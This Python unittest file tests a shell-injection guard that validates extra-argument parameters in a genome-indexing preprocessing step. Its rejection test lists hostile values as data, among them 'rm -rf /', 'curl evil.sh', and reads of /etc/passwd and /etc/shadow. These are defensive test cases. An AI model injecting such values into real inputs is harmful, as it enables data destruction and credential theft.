"""Offline tests for the index_genomes shell-injection guard.

Runs without the Cirro SDK: the import is stubbed before preprocess is loaded,
so this is a plain `python -m unittest` with no platform dependency.
"""
import sys
import types
import unittest
from pathlib import Path


def _load_preprocess():
    helpers = types.ModuleType("cirro.helpers.preprocess_dataset")
    helpers.PreprocessDataset = object
    cirro = types.ModuleType("cirro")
    cirro_helpers = types.ModuleType("cirro.helpers")
    sys.modules.setdefault("cirro", cirro)
    sys.modules.setdefault("cirro.helpers", cirro_helpers)
    sys.modules["cirro.helpers.preprocess_dataset"] = helpers

    import importlib.util
    path = Path(__file__).with_name("preprocess.py")
    spec = importlib.util.spec_from_file_location("index_genomes_preprocess", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


preprocess = _load_preprocess()


class FakeLogger:
    def __init__(self):
        self.messages = []

    def info(self, message):
        self.messages.append(message)


class FakeDataset:
    def __init__(self, params):
        self.params = dict(params)
        self.logger = FakeLogger()


class ValidateExtraArgs(unittest.TestCase):

    def accepts(self, value):
        ds = FakeDataset({"star_extra_args": value})
        preprocess.validate_extra_args(ds, "star_extra_args")
        return ds

    def rejects(self, value):
        ds = FakeDataset({"star_extra_args": value})
        with self.assertRaises(ValueError) as caught:
            preprocess.validate_extra_args(ds, "star_extra_args")
        self.assertIn("star_extra_args", str(caught.exception))

    def test_typical_flags_pass(self):
        for value in [
            "--genomeSAindexNbases 11",
            "--attribute=gene_biotype:protein_coding",
            "--sjdbOverhang 100 --runThreadN 4",
            "--outFileNamePrefix out/prefix_1.2",
            "--limitGenomeGenerateRAM 32000000000",
            "--extra a,b,c",
            "--tag user@example.com",
            "--pct 50%",
            "--use-salmon",
        ]:
            with self.subTest(value=value):
                ds = self.accepts(value)
                self.assertEqual(len(ds.logger.messages), 1)

    def test_shell_metacharacters_are_rejected(self):
        for value in [
            "--flag; rm -rf /",
            "--flag && curl evil.sh",
            "--flag | tee /etc/passwd",
            "--flag `whoami`",
            "--flag $(id)",
            "--flag $HOME",
            "--flag > /dev/null",
            "--flag < /etc/shadow",
            "--flag \\\nrm",
            "--flag 'quoted'",
            '--flag "quoted"',
            "--flag {a,b}",
            "--flag *",
            "--flag ~/x",
            "--flag !!",
            "--flag #comment",
            "--flag ^x",
            "--flag\nrm -rf /",
        ]:
            with self.subTest(value=value):
                self.rejects(value)

    def test_absent_and_empty_values_are_skipped(self):
        for value in [None, ""]:
            with self.subTest(value=value):
                ds = FakeDataset({"star_extra_args": value})
                preprocess.validate_extra_args(ds, "star_extra_args")
                self.assertEqual(ds.logger.messages, [])

    def test_missing_param_is_skipped(self):
        ds = FakeDataset({})
        preprocess.validate_extra_args(ds, "absent_args")
        self.assertEqual(ds.logger.messages, [])


class SuffixSelection(unittest.TestCase):
    """The entrypoint validates every param ending in _args, not just _extra_args.

    The Cell Ranger builders name theirs per subcommand -- cellranger_mkref_args,
    cellranger_mkgtf_args, cellranger_mkvdjref_args -- so the narrower suffix
    would have let those through the guard unchecked.
    """

    def selected(self, params):
        return [name for name in params if name.endswith("_args")]

    def test_cellranger_subcommand_args_are_covered(self):
        params = [
            "cellranger_mkref_args",
            "cellranger_mkgtf_args",
            "cellranger_mkvdjref_args",
            "cellrangerarc_mkref_args",
            "star_extra_args",
            "simpleaf_extra_args",
            "kb_extra_args",
            "fasta",
            "gtf",
            "container",
        ]
        self.assertEqual(
            self.selected(params),
            [
                "cellranger_mkref_args",
                "cellranger_mkgtf_args",
                "cellranger_mkvdjref_args",
                "cellrangerarc_mkref_args",
                "star_extra_args",
                "simpleaf_extra_args",
                "kb_extra_args",
            ],
        )


if __name__ == "__main__":
    unittest.main()
